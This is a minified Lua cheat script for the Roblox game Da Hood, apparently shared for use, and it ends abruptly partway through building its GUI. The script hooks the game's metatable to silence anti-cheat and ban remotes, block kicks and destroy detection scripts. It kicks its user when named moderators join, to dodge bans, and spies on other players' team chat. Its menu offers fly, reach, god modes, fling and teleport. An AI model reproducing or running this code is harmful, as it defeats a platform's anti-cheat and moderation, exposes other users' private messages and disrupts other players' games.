--Sorry it was minified when i got it so it may look a bit stupid
if not game:IsLoaded() then
    game.Loaded:Wait()
end
if game.PlaceId ~= 2788229376 then
    game.Players.LocalPlayer:Kick("[$-T0P-$] v3 is for da hood only!")
end
if topv3_loaded == true then
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {Title = "Erorr:", Text = "[$-T0P-$] v3 already running!", Time = 10}
    )
    return
end
pcall(
    function()
        getgenv().topv3_loaded = true
    end
)
game:GetService("StarterGui"):SetCore(
    "SendNotification",
    {Title = "My Discord:", Text = "discord.gg/64UqmWpgTy", Time = 10}
)
enabled = true
spyOnMyself = true
public = false
publicItalics = true
privateProperties = {Color = Color3.fromRGB(0, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 18}
local a = game:GetService("StarterGui")
local b = game:GetService("Players")
local c = b.LocalPlayer or b:GetPropertyChangedSignal("LocalPlayer"):Wait() or b.LocalPlayer
local d =
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local e =
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
    "OnMessageDoneFiltering"
)
local f = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = f
local function g(h, i)
    if _G.chatSpyInstance == f then
        if h == c and i:lower():sub(1, 4) == "/spy" then
            enabled = not enabled
            wait(0.3)
            privateProperties.Text = "{SPY " .. (enabled and "EN" or "DIS") .. "ABLED}"
            a:SetCore("ChatMakeSystemMessage", privateProperties)
        elseif enabled and (spyOnMyself == true or h ~= c) then
            i = i:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
            local j = true
            local k =
                e.OnClientEvent:Connect(
                function(l, m)
                    if
                        l.SpeakerUserId == h.UserId and l.Message == i:sub(#i - #l.Message + 1) and
                            (m == "All" or m == "Team" and public == false and b[l.FromSpeaker].Team == c.Team)
                     then
                        j = false
                    end
                end
            )
            wait(1)
            k:Disconnect()
            if j and enabled then
                if public then
                    d:FireServer((publicItalics and "/me " or "") .. "{SPY} [" .. h.Name .. "]: " .. i, "All")
                else
                    privateProperties.Text = "{SPY} [" .. h.Name .. "]: " .. i
                    a:SetCore("ChatMakeSystemMessage", privateProperties)
                end
            end
        end
    end
end
for n, h in ipairs(b:GetPlayers()) do
    h.Chatted:Connect(
        function(i)
            g(h, i)
        end
    )
end
b.PlayerAdded:Connect(
    function(h)
        h.Chatted:Connect(
            function(i)
                g(h, i)
            end
        )
    end
)
privateProperties.Text = "{SPY " .. (enabled and "EN" or "DIS") .. "ABLED}"
a:SetCore("ChatMakeSystemMessage", privateProperties)
if not c.PlayerGui:FindFirstChild("Chat") then
    wait(3)
end
local o = c.PlayerGui.Chat.Frame
o.ChatChannelParentFrame.Visible = true
o.ChatBarParentFrame.Position =
    o.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), o.ChatChannelParentFrame.Size.Y)
repeat
    wait()
until game:IsLoaded()
local p = getrawmetatable(game)
setreadonly(p, false)
local q = p.__namecall
p.__namecall =
    newcclosure(
    function(self, ...)
        local r = {...}
        if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
            if tostring(getcallingscript()) ~= "Framework" then
                return
            end
        end
        if not checkcaller() and getnamecallmethod() == "Kick" then
            return
        end
        return q(self, unpack(r))
    end
)
spawn(
    function()
        Admins = {
            "JokeTheFool",
            "ITopStarI",
            "Sherosama",
            "Papa_Mbaye",
            "AStrongMuscle",
            "iRenn",
            "NikoSenpai",
            "UziGarage",
            "iumu",
            "Benoxa",
            "Luutyy",
            "clubstar54",
            "givkitheth",
            "zakblak20",
            "MarTheWise",
            "BeeTheKidd",
            "qtCeleste",
            "coreten",
            "LegacyCross",
            "NatsuDBlaze",
            "Asuyia",
            "POMPKUN",
            "Untold_Joke",
            "MoodJesus",
            "AfroDs",
            "MarkoSumisu",
            "Greed_Ocean",
            "givkitheth",
            "DrxcoBaby",
            "DrxcoRxsh",
            "XavierWildYT",
            "dtbbullet",
            "ATKDrizzy",
            "bull_bot"
        }
        for s, t in pairs(game:GetService("Players"):GetPlayers()) do
            if t.Name == unpack(Admins) then
                game:GetService("Players").LocalPlayer:Kick("$-T0P-$ Defense : Admin Joined, Kicked To Prevent Ban")
            end
        end
        game:GetService("Players").PlayerAdded:Connect(
            function(u)
                if u.Name == unpack(Admins) then
                    game:GetService("Players").LocalPlayer:Kick("$-T0P-$ Defense : Admin Joined, Kicked To Prevent Ban")
                end
            end
        )
    end
)
local v = {CHECKER_1 = true, TeleportDetect = true, OneMoreTime = true, BANREMOTE = true, KICKREMOTE = true}
local w = getrawmetatable(game)
local x = w.__namecall
setreadonly(w, false)
w.__namecall =
    newcclosure(
    function(...)
        local y = getnamecallmethod()
        local r = {...}
        if y == "FireServer" and tostring(r[1]) == "MainEvent" and v[r[2]] then
            return wait(9e9)
        end
        if y == "CHECKER_1" and tostring(r[1]) == "MainEvent" and v[r[2]] then
            return wait(9e9)
        end
        if y == "KICKREMOTE" and tostring(r[1]) == "MainEvent" and v[r[2]] then
            return wait(9e9)
        end
        if y == "BANREMOTE" and tostring(r[1]) == "MainEvent" and v[r[2]] then
            return wait(9e9)
        end
        if not checkcaller() and getfenv(1).crash ~= nil and getfenv(1).checkChild ~= nil then
            getcallingscript():Destroy()
            return wait(9e9)
        end
        return x(...)
    end
)
setreadonly(w, true)
function toTarget(z, A, B)
    local C = game:service "TweenService"
    local D = TweenInfo.new((A - z).Magnitude / 170, Enum.EasingStyle.Quad)
    local E = tick()
    local F, G =
        pcall(
        function()
            local F = C:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], D, {CFrame = B})
            F:Play()
        end
    )
    if not F then
        return G
    end
end
function ToShoes(z, A, B)
    local C = game:service "TweenService"
    local D = TweenInfo.new((A - z).Magnitude / 50, Enum.EasingStyle.Quad)
    local E = tick()
    local F, G =
        pcall(
        function()
            local F = C:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], D, {CFrame = B})
            F:Play()
        end
    )
    if not F then
        return G
    end
end
local function H(I, J)
    local K = (I.Position - J.Position).magnitude
    if K <= 50 then
        fireclickdetector(J:FindFirstChild("ClickDetector"), 4)
        return K
    end
end
function GetPlayer(L)
    local M = {}
    local N = L:lower()
    for s, O in pairs(game.Players:GetPlayers()) do
        if O.Name:lower():sub(1, #L) == L:lower() or O.DisplayName:lower():sub(1, #L) == L:lower() then
            table.insert(M, O.Name)
        end
    end
    return M
end
local function P()
    for s, O in pairs(
        game.Workspace:FindPartsInRegion3(
            Region3.new(
                game.Players.LocalPlayer:GetMouse().Hit.Position,
                game.Players.LocalPlayer:GetMouse().Hit.Position
            )
        )
    ) do
        local Q = game.Players:GetPlayerFromCharacter(O.Parent)
        if Q ~= nil and Q ~= game.Players.LocalPlayer then
            return Q
        end
    end
    return nil
end
game:GetService("Players").LocalPlayer.Idled:connect(
    function()
        game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        wait(1)
        game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end
)
local R = {324223011, 2410048704}
local function S()
    for s, O in pairs(game:GetService("Workspace").Players:GetChildren()) do
        if O:FindFirstChild("UpperTorso") then
            if not O:FindFirstChild("UpperTorso"):FindFirstChild("OriginalSize") then
                local T = game:GetService("Players"):FindFirstChild(O.Name)
                if T then
                    local U = game:GetService("Players"):FindFirstChild(O.Name).UserId
                    if table.find(R, U) then
                        if O:FindFirstChildWhichIsA("Humanoid") then
                            O:FindFirstChildWhichIsA("Humanoid").DisplayName = "[⭐]" .. game.Players[O.Name].DisplayName
                        end
                    else
                        if O:FindFirstChildWhichIsA("Humanoid") then
                            O:FindFirstChildWhichIsA("Humanoid").DisplayName =
                                "[💎]" .. game.Players[O.Name].DisplayName
                        end
                    end
                end
            end
        end
    end
end
S()
local V, W =
    pcall(
    function()
        local X = Instance.new("ScreenGui")
        local Y = Instance.new("Frame")
        local Z = Instance.new("Frame")
        local _ = Instance.new("TextButton")
        local a0 = Instance.new("UIGradient")
        local a1 = Instance.new("TextButton")
        local a2 = Instance.new("UIGradient")
        local a3 = Instance.new("TextButton")
        local a4 = Instance.new("UIGradient")
        local a5 = Instance.new("TextButton")
        local a6 = Instance.new("UIGradient")
        local a7 = Instance.new("TextLabel")
        local a8 = Instance.new("UIGradient")
        local a9 = Instance.new("Frame")
        local aa = Instance.new("TextButton")
        local ab = Instance.new("UIGradient")
        local ac = Instance.new("TextButton")
        local ad = Instance.new("UIGradient")
        local ae = Instance.new("Frame")
        local af = Instance.new("ImageLabel")
        local ag = Instance.new("Frame")
        local ah = Instance.new("Frame")
        local ai = Instance.new("UIGradient")
        local aj = Instance.new("ImageLabel")
        local ak = Instance.new("UICorner")
        local al = Instance.new("TextLabel")
        local am = Instance.new("TextBox")
        local an = Instance.new("TextLabel")
        local ao = Instance.new("TextButton")
        local ap = Instance.new("Frame")
        local aq = Instance.new("Frame")
        local ar = Instance.new("TextButton")
        local as = Instance.new("TextButton")
        local at = Instance.new("TextButton")
        local au = Instance.new("TextButton")
        local av = Instance.new("TextButton")
        local aw = Instance.new("TextButton")
        local ax = Instance.new("TextButton")
        local ay = Instance.new("TextButton")
        local az = Instance.new("TextButton")
        local aA = Instance.new("TextButton")
        local aB = Instance.new("TextButton")
        local aC = Instance.new("TextButton")
        local aD = Instance.new("TextButton")
        local aE = Instance.new("TextButton")
        local aF = Instance.new("TextButton")
        local aG = Instance.new("Frame")
        local aH = Instance.new("TextButton")
        local aI = Instance.new("TextButton")
        local aJ = Instance.new("TextButton")
        local aK = Instance.new("TextButton")
        local aL = Instance.new("TextButton")
        local aM = Instance.new("TextButton")
        local aN = Instance.new("TextButton")
        local aO = Instance.new("TextButton")
        local aP = Instance.new("TextButton")
        local aQ = Instance.new("TextButton")
        local aR = Instance.new("TextButton")
        local aS = Instance.new("TextButton")
        local aT = Instance.new("TextButton")
        local aU = Instance.new("TextButton")
        local aV = Instance.new("TextButton")
        local aW = Instance.new("Frame")
        local aX = Instance.new("TextButton")
        local aY = Instance.new("TextButton")
        local aZ = Instance.new("TextButton")
        local a_ = Instance.new("TextButton")
        local b0 = Instance.new("TextButton")
        local b1 = Instance.new("TextButton")
        local b2 = Instance.new("TextButton")
        local b3 = Instance.new("TextButton")
        local b4 = Instance.new("TextButton")
        local b5 = Instance.new("TextButton")
        local b6 = Instance.new("TextButton")
        local b7 = Instance.new("TextButton")
        local b8 = Instance.new("TextButton")
        local b9 = Instance.new("TextButton")
        local ba = Instance.new("TextButton")
        local bb = Instance.new("Frame")
        local bc = Instance.new("TextButton")
        local bd = Instance.new("TextButton")
        local be = Instance.new("TextButton")
        local bf = Instance.new("TextButton")
        local bg = Instance.new("TextButton")
        local bh = Instance.new("TextButton")
        local bi = Instance.new("TextButton")
        local bj = Instance.new("TextButton")
        local bk = Instance.new("TextButton")
        local bl = Instance.new("TextButton")
        local bm = Instance.new("TextButton")
        local bn = Instance.new("TextButton")
        local bo = Instance.new("TextButton")
        local bp = Instance.new("TextButton")
        local bq = Instance.new("TextButton")
        local br = Instance.new("Frame")
        local bs = Instance.new("TextButton")
        local bt = Instance.new("TextLabel")
        local bu = Instance.new("TextButton")
        local bv = Instance.new("TextLabel")
        local bw = Instance.new("TextButton")
        local bx = Instance.new("TextLabel")
        local by = Instance.new("TextButton")
        local bz = Instance.new("TextLabel")
        local bA = Instance.new("TextButton")
        local bB = Instance.new("TextLabel")
        local bC = Instance.new("TextButton")
        local bD = Instance.new("TextLabel")
        local bE = Instance.new("TextButton")
        local bF = Instance.new("TextLabel")
        local bG = Instance.new("TextButton")
        local bH = Instance.new("TextLabel")
        local bI = Instance.new("TextButton")
        local bJ = Instance.new("TextLabel")
        local bK = Instance.new("TextButton")
        local bL = Instance.new("TextLabel")
        local bM = Instance.new("TextButton")
        local bN = Instance.new("TextLabel")
        local bO = Instance.new("TextButton")
        local bP = Instance.new("TextLabel")
        local bQ = Instance.new("TextButton")
        local bR = Instance.new("TextLabel")
        local bS = Instance.new("TextButton")
        local bT = Instance.new("TextLabel")
        local bU = Instance.new("TextButton")
        local bV = Instance.new("TextLabel")
        local bW = Instance.new("Frame")
        local bX = Instance.new("TextBox")
        local bY = Instance.new("TextLabel")
        local bZ = Instance.new("TextButton")
        local b_ = Instance.new("TextButton")
        local c0 = Instance.new("TextLabel")
        local c1 = Instance.new("TextLabel")
        local c2 = Instance.new("UICorner")
        local c3 = Instance.new("Frame")
        local c4 = Instance.new("TextButton")
        local function c5()
            local c6 = game:GetService("Players").LocalPlayer
            local c7 = c6.Character
            c7:FindFirstChildOfClass("Humanoid").Health = 0
            local c8 = c6.CharacterAdded:Wait()
            local c9 = Instance.new("Folder")
            c9.Name = "FULLY_LOADED_CHAR"
            c9.Parent = c8
            c8:WaitForChild("RagdollConstraints"):Destroy()
            local ca = Instance.new("BoolValue", c8)
            ca.Name = "RagdollConstraints"
        end
        local function cb(cc, cd)
            game.StarterGui:SetCore("SendNotification", {Text = cc, Duration = cd})
        end
        X.Name = "Swagmode"
        X.Parent = game.CoreGui
        X.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        Y.Name = "SwagmodeFrame"
        Y.Parent = X
        Y.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        Y.BorderSizePixel = 0
        Y.Position = UDim2.new(0.212884605, 0, 0.190036908, 0)
        Y.Size = UDim2.new(0, 605, 0, 336)
        Z.Name = "MenuFrame"
        Z.Parent = Y
        Z.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        Z.BorderSizePixel = 0
        Z.Size = UDim2.new(0, 155, 0, 336)
        _.Name = "TogglesButton"
        _.Parent = Z
        _.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        _.BorderSizePixel = 0
        _.Position = UDim2.new(0.0922105312, 0, 0.440625668, 0)
        _.Size = UDim2.new(0, 123, 0, 31)
        _.AutoButtonColor = false
        _.Font = Enum.Font.GothamBlack
        _.Text = "Toggles"
        _.TextColor3 = Color3.fromRGB(255, 0, 0)
        _.TextSize = 14.000
        a0.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        a0.Offset = Vector2.new(0.100000001, 0)
        a0.Parent = _
        a1.Name = "QuickTpButton"
        a1.Parent = Z
        a1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        a1.BorderSizePixel = 0
        a1.Position = UDim2.new(0.0922105312, 0, 0.573581994, 0)
        a1.Size = UDim2.new(0, 123, 0, 31)
        a1.AutoButtonColor = false
        a1.Font = Enum.Font.GothamBlack
        a1.Text = "Quick TP"
        a1.TextColor3 = Color3.fromRGB(255, 0, 0)
        a1.TextSize = 14.000
        a2.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        a2.Offset = Vector2.new(0.100000001, 0)
        a2.Parent = a1
        a3.Name = "SideButton"
        a3.Parent = Z
        a3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        a3.BorderSizePixel = 0
        a3.Position = UDim2.new(0.0922105312, 0, 0.307098716, 0)
        a3.Size = UDim2.new(0, 123, 0, 31)
        a3.AutoButtonColor = false
        a3.Font = Enum.Font.GothamBlack
        a3.Text = "Side Scripts"
        a3.TextColor3 = Color3.fromRGB(255, 0, 0)
        a3.TextSize = 14.000
        a4.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        a4.Offset = Vector2.new(0.100000001, 0)
        a4.Parent = a3
        a5.Name = "imiecredits"
        a5.Parent = Z
        a5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        a5.BackgroundTransparency = 0
        a5.BorderSizePixel = 0
        a5.Position = UDim2.new(0.0922105312, 0, 0.854166687, 0)
        a5.Size = UDim2.new(0, 123, 0, 31)
        a5.AutoButtonColor = false
        a5.Font = Enum.Font.GothamBlack
        a5.Text = "FUN Scripts"
        a5.TextColor3 = Color3.fromRGB(255, 0, 0)
        a5.TextSize = 14.000
        a6.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        a6.Offset = Vector2.new(0.100000001, 0)
        a6.Parent = a5
        a7.Name = "Swagmode"
        a7.Parent = Z
        a7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        a7.BackgroundTransparency = 1.000
        a7.Position = UDim2.new(0.045161292, 0, 0, 0)
        a7.Size = UDim2.new(0, 115, 0, 34)
        a7.Font = Enum.Font.GothamBlack
        a7.Text = "[$-T0P-$] v3"
        a7.TextColor3 = Color3.fromRGB(255, 255, 255)
        a7.TextSize = 20.000
        a8.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
        }
        a8.Offset = Vector2.new(0.100000001, 0)
        a8.Parent = a7
        a9.Parent = Z
        a9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        a9.BorderSizePixel = 0
        a9.Position = UDim2.new(0.045161292, 0, 0.092261903, 0)
        a9.Size = UDim2.new(0, 126, 0, 3)
        aa.Name = "MainButton"
        aa.Parent = Z
        aa.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        aa.BorderSizePixel = 0
        aa.Position = UDim2.new(0.0922105238, 0, 0.178689778, 0)
        aa.Size = UDim2.new(0, 123, 0, 31)
        aa.AutoButtonColor = false
        aa.Font = Enum.Font.GothamBlack
        aa.Text = "Main Scripts"
        aa.TextColor3 = Color3.fromRGB(255, 0, 0)
        aa.TextSize = 14.000
        ab.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        ab.Offset = Vector2.new(0.100000001, 0)
        ab.Parent = aa
        ac.Name = "SellingButton"
        ac.Parent = Z
        ac.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        ac.BorderSizePixel = 0
        ac.Position = UDim2.new(0.0986621454, 0, 0.716439128, 0)
        ac.Size = UDim2.new(0, 123, 0, 31)
        ac.AutoButtonColor = false
        ac.Font = Enum.Font.GothamBlack
        ac.Text = "Selling Tools"
        ac.TextColor3 = Color3.fromRGB(255, 0, 0)
        ac.TextSize = 14.000
        ad.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        ad.Offset = Vector2.new(0.100000001, 0)
        ad.Parent = ac
        ae.Name = "DropShadowHolder"
        ae.Parent = Y
        ae.BackgroundTransparency = 1.000
        ae.BorderSizePixel = 0
        ae.Size = UDim2.new(1, 0, 1, 0)
        ae.ZIndex = 0
        af.Name = "DropShadow"
        af.Parent = ae
        af.AnchorPoint = Vector2.new(0.5, 0.5)
        af.BackgroundTransparency = 1.000
        af.BorderSizePixel = 0
        af.Position = UDim2.new(0.5, 0, 0.5, 0)
        af.Size = UDim2.new(1, 47, 1, 47)
        af.ZIndex = 0
        af.Image = "rbxassetid://6015897843"
        af.ImageColor3 = Color3.fromRGB(0, 0, 0)
        af.ImageTransparency = 0.200
        af.ScaleType = Enum.ScaleType.Slice
        af.SliceCenter = Rect.new(49, 49, 450, 450)
        ag.Name = "TopLine"
        ag.Parent = Y
        ag.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ag.BorderSizePixel = 0
        ag.Position = UDim2.new(0.256198347, 0, 0, 0)
        ag.Size = UDim2.new(0, 450, 0, 7)
        ah.Name = "SideInfo"
        ah.Parent = Y
        ah.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ah.BorderSizePixel = 0
        ah.Position = UDim2.new(0.778512418, 0, 0.020833334, 0)
        ah.Size = UDim2.new(0, 134, 0, 329)
        ai.Color =
            ColorSequence.new {
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 176, 0))
        }
        ai.Offset = Vector2.new(0.100000001, 0)
        ai.Parent = ah
        aj.Name = "TargetImage"
        aj.Parent = ah
        aj.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        aj.Position = UDim2.new(0.0950299203, 0, 0.0244709235, 0)
        aj.Size = UDim2.new(0, 108, 0, 104)
        aj.Image = "http://www.roblox.com/asset/?id=40413049"
        aj.ImageColor3 = Color3.fromRGB(300, 300, 300)
        ak.CornerRadius = UDim.new(0, 500)
        ak.Parent = aj
        al.Name = "CashLabel"
        al.Parent = ah
        al.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        al.BorderSizePixel = 0
        al.Position = UDim2.new(0.072641857, 0, 0.519756854, 0)
        al.Size = UDim2.new(0, 115, 0, 26)
        al.Font = Enum.Font.SourceSans
        al.Text = "Cash:"
        al.TextColor3 = Color3.fromRGB(255, 0, 0)
        al.TextSize = 14.000
        am.Name = "TargetTextbox"
        am.Parent = ah
        am.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        am.BorderSizePixel = 0
        am.Position = UDim2.new(0.072641857, 0, 0.392097205, 0)
        am.Size = UDim2.new(0, 115, 0, 31)
        am.Font = Enum.Font.GothamBlack
        am.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
        am.Text = ""
        am.TextColor3 = Color3.fromRGB(255, 0, 0)
        am.TextSize = 14.000
        am.TextWrapped = true
        am.TextScaled = true
        an.Name = "BountyLabel"
        an.Parent = ah
        an.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        an.BorderSizePixel = 0
        an.Position = UDim2.new(0.072641857, 0, 0.633550763, 0)
        an.Size = UDim2.new(0, 115, 0, 26)
        an.Font = Enum.Font.SourceSans
        an.Text = "Bounty:"
        an.TextColor3 = Color3.fromRGB(255, 0, 0)
        an.TextSize = 14.000
        ao.Name = "CrewLabel"
        ao.Parent = ah
        ao.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        ao.BorderSizePixel = 0
        ao.Position = UDim2.new(0.072641857, 0, 0.737304032, 0)
        ao.Size = UDim2.new(0, 115, 0, 26)
        ao.Font = Enum.Font.SourceSans
        ao.Text = "Crew:"
        ao.TextColor3 = Color3.fromRGB(255, 0, 0)
        ao.TextSize = 14.000
        ao.TextScaled = true
        ap.Name = "Buttons"
        ap.Parent = Y
        ap.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ap.BackgroundTransparency = 1.000
        ap.Position = UDim2.new(0.256198347, 0, 0.0297619049, 0)
        ap.Size = UDim2.new(0, 316, 0, 325)
        aq.Name = "MainFrame"
        aq.Parent = ap
        aq.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        aq.BackgroundTransparency = 1.000
        aq.Size = UDim2.new(0, 316, 0, 325)
        aq.Visible = true
        ar.Name = "FreeFists"
        ar.Parent = aq
        ar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ar.BorderSizePixel = 0
        ar.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
        ar.Size = UDim2.new(0, 94, 0, 46)
        ar.Font = Enum.Font.GothamBlack
        ar.Text = "FreeFists(T)"
        ar.TextColor3 = Color3.fromRGB(255, 0, 0)
        ar.TextSize = 14.000
        as.Name = "GodBlock"
        as.Parent = aq
        as.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        as.BorderSizePixel = 0
        as.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
        as.Size = UDim2.new(0, 94, 0, 46)
        as.Font = Enum.Font.GothamBlack
        as.Text = "GodBlock"
        as.TextColor3 = Color3.fromRGB(255, 0, 0)
        as.TextSize = 14.000
        at.Name = "GodArmor"
        at.Parent = aq
        at.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        at.BorderSizePixel = 0
        at.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
        at.Size = UDim2.new(0, 94, 0, 46)
        at.Font = Enum.Font.GothamBlack
        at.Text = "GodArmor"
        at.TextColor3 = Color3.fromRGB(255, 0, 0)
        at.TextSize = 14.000
        au.Name = "FlySpeedMinus"
        au.Parent = aq
        au.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        au.BorderSizePixel = 0
        au.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
        au.Size = UDim2.new(0, 94, 0, 46)
        au.Font = Enum.Font.GothamBlack
        au.Text = "FlySpeed -"
        au.TextColor3 = Color3.fromRGB(255, 0, 0)
        au.TextSize = 14.000
        av.Name = "Fly"
        av.Parent = aq
        av.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        av.BorderSizePixel = 0
        av.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
        av.Size = UDim2.new(0, 94, 0, 46)
        av.Font = Enum.Font.GothamBlack
        av.Text = "Fly(X)"
        av.TextColor3 = Color3.fromRGB(255, 0, 0)
        av.TextSize = 14.000
        aw.Name = "Fling"
        aw.Parent = aq
        aw.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aw.BorderSizePixel = 0
        aw.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
        aw.Size = UDim2.new(0, 94, 0, 46)
        aw.Font = Enum.Font.GothamBlack
        aw.Text = "Fling"
        aw.TextColor3 = Color3.fromRGB(255, 0, 0)
        aw.TextSize = 14.000
        ax.Name = "NoRecoil"
        ax.Parent = aq
        ax.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ax.BorderSizePixel = 0
        ax.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
        ax.Size = UDim2.new(0, 94, 0, 46)
        ax.Font = Enum.Font.GothamBlack
        ax.Text = "NoRecoil"
        ax.TextColor3 = Color3.fromRGB(255, 0, 0)
        ax.TextSize = 14.000
        ay.Name = "GoTo"
        ay.Parent = aq
        ay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ay.BorderSizePixel = 0
        ay.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
        ay.Size = UDim2.new(0, 94, 0, 46)
        ay.Font = Enum.Font.GothamBlack
        ay.Text = "GoTo"
        ay.TextColor3 = Color3.fromRGB(255, 0, 0)
        ay.TextSize = 14.000
        az.Name = "View"
        az.Parent = aq
        az.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        az.BorderSizePixel = 0
        az.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
        az.Size = UDim2.new(0, 94, 0, 46)
        az.Font = Enum.Font.GothamBlack
        az.Text = "View"
        az.TextColor3 = Color3.fromRGB(255, 0, 0)
        az.TextSize = 14.000
        aA.Name = "Target"
        aA.Parent = aq
        aA.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aA.BorderSizePixel = 0
        aA.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
        aA.Size = UDim2.new(0, 94, 0, 46)
        aA.Font = Enum.Font.GothamBlack
        aA.Text = "Target"
        aA.TextColor3 = Color3.fromRGB(255, 0, 0)
        aA.TextSize = 14.000
        aB.Name = "FlySpeedPlus"
        aB.Parent = aq
        aB.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aB.BorderSizePixel = 0
        aB.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
        aB.Size = UDim2.new(0, 94, 0, 46)
        aB.Font = Enum.Font.GothamBlack
        aB.Text = "FlySpeed +"
        aB.TextColor3 = Color3.fromRGB(255, 0, 0)
        aB.TextSize = 14.000
        aC.Name = "NoClip"
        aC.Parent = aq
        aC.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aC.BorderSizePixel = 0
        aC.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
        aC.Size = UDim2.new(0, 94, 0, 46)
        aC.Font = Enum.Font.GothamBlack
        aC.Text = "Fake Macro"
        aC.TextColor3 = Color3.fromRGB(255, 0, 0)
        aC.TextSize = 14.000
        aD.Name = "FlyMode"
        aD.Parent = aq
        aD.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aD.BorderSizePixel = 0
        aD.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
        aD.Size = UDim2.new(0, 94, 0, 46)
        aD.Font = Enum.Font.GothamBlack
        aD.Text = "FlyMode"
        aD.TextColor3 = Color3.fromRGB(255, 0, 0)
        aD.TextSize = 14.000
        aE.Name = "Reach"
        aE.Parent = aq
        aE.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aE.BorderSizePixel = 0
        aE.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
        aE.Size = UDim2.new(0, 94, 0, 46)
        aE.Font = Enum.Font.GothamBlack
        aE.Text = "Reach"
        aE.TextColor3 = Color3.fromRGB(255, 0, 0)
        aE.TextSize = 14.000
        aF.Name = "Headless"
        aF.Parent = aq
        aF.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aF.BorderSizePixel = 0
        aF.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
        aF.Size = UDim2.new(0, 94, 0, 46)
        aF.Font = Enum.Font.GothamBlack
        aF.Text = "Headless"
        aF.TextColor3 = Color3.fromRGB(255, 0, 0)
        aF.TextSize = 14.000
        aG.Name = "QuickTpFrame"
        aG.Parent = ap
        aG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        aG.BackgroundTransparency = 1.000
